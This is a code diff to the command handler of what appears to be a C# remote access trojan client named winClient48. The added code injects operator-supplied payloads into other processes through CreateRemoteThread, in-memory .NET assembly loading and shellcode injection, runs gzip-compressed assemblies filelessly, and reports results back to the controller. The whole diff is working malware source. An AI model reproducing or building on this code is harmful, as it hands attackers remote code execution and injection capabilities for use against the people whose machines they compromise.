@@ -2156,17 +2156,28 @@ namespace winClient48
 
                 else if (cmd[0] == "dll")
                 {
-                    if (cmd[1] == "inject")
-                    {
-                        int nPid = int.Parse(cmd[2]);
-                        byte[] abDllBuffer = Convert.FromBase64String(cmd[3]);
+                    DllLoaderMethod dlm = (DllLoaderMethod)int.Parse(cmd[1]);
+                    byte[] abBuffer = Convert.FromBase64String(cmd[2]);
 
-                        var x = DllLoader.Inject(nPid, abDllBuffer);
-                    }
-                    else if (cmd[1] == "load")
-                    {
+                    (int nCode, string szMsg) x = (0, "Do nothing.");
 
+                    switch (dlm)
+                    {
+                        case DllLoaderMethod.CreateRemoteThread:
+                            int nProcId = int.Parse(cmd[3]);
+                            x = clsLoader.fnRemoteThread(abBuffer, nProcId);
+                            break;
+                        case DllLoaderMethod.DotNetAssemblyLoad:
+                            string szTypeName = cmd[3];
+                            string szMethod = cmd[4];
+                            x = clsLoader.fnLoadDotNetDll(abBuffer, szTypeName, szMethod);
+                            break;
+                        case DllLoaderMethod.ShellCode:
+                            x = clsLoader.fnInjectShellCode(abBuffer);
+                            break;
                     }
+
+                    v.SendCommand($"dll|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
                 }
 
                 #endregion
@@ -2174,15 +2185,11 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
-                    MessageBox.Show("A");
-
                     string[] alpArgs = cmd[1].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                     byte[] abAssembly = Convert.FromBase64String(cmd[2]);
                     abAssembly = clsEZData.abGzipDecompress(abAssembly);
 
                     installer.fnLoadToMemory(alpArgs, abAssembly);
-
-                    MessageBox.Show("B");
                 }
 
                 #endregion
